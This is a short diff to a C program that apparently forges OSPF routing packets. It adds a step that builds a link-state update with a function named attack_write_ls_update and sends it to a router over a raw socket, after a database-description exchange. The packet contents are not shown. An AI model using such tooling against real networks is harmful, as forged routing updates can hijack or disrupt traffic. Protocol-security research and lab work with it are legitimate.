@@ -67,6 +67,13 @@ int main(int argc, char *argv[]) {
   }
   printf("Send DB Description success (%d).\n", ret_value);
 
+  packet_len = attack_write_ls_update(buffer, local_mac, local_ip, router_ip);
+  if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
+    printf("ERROR! sendto() \n");
+    exit(1);
+  }
+  printf("Send LS Update success (%d).\n", ret_value);
+
   return 0;
 }
 
